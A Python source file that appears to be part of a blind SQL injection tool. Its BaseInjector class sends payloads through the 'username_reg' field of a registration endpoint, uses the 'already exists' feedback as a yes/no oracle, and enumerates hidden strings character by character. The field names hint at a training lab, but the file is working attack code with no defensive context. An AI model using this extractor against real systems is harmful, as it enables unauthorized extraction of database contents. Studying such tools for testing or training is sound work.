from typing import List, Optional
import requests
import json
from .config import Config

class BaseInjector:
    def __init__(self, config: Config):
        self.config = config
        self.alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
        self.extended_chars = self.alphabet + '@.'
        
    def _make_request(self, payload: str) -> bool:
        """Make a request to the target with the given payload."""
        data = {
            'username_reg': payload,
            'email_reg': 'a@a',
            'password_reg': 'a',
            'confirm_password_reg': 'a'
        }
        
        try:
            response = requests.put(
                self.config.base_url,
                headers=self.config.headers,
                data=data
            )
            result = json.loads(response.text)
            return "already exists" in result['feedback']
        except Exception as e:
            print(f"Error making request: {e}")
            return False
            
    def _enumerate_string(self, check_func, chars: str = None, prefix: str = '') -> Optional[str]:
        """Generic string enumeration function."""
        chars = chars or self.alphabet
        result = prefix
        
        while True:
            found_char = False
            for char in chars:
                if check_func(result + char):
                    result += char
                    print(f"Building string: {result}")
                    found_char = True
                    break
                    
            if not found_char:
                return result if result != prefix else None
